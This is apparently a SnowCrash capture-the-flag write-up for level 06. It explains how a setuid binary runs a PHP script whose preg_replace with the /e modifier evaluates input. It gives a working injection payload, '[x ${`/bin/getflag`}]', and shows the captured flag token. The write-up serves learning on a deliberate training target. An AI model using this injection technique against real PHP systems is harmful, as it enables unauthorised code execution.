# Level 06

## Reconnaissance

In the home directory of `level06`, we find two interesting files:

- `level06`: binary owned by `flag06`
- `level06.php`: a PHP script that appears to be related

```bash
level06@SnowCrash:~$ ls -l
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

## PHP Script Analysis

Content of `level06.php`:

```php
function y($m) {
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}
function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
```

### Vulnerability

- The script reads a file passed as the first argument.
- It uses `preg_replace` with the `/e` modifier, which evaluates the matched content as PHP code.
- This allows command injection by writing `[x ${\`/bin/getflag\`}]` in the input file.
- The call to `y()` slightly transforms the code, but `${\`command\`}` remains executable and bypasses it.

## Exploitation

Create a file with malicious content:

```bash
level06@SnowCrash:~$ echo '[x ${`/bin/getflag`}]' > /tmp/exploit/input
level06@SnowCrash:~$ ./level06 /tmp/exploit/input
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

The binary executes the command as `flag06`, and the flag is revealed.

## Additional Notes
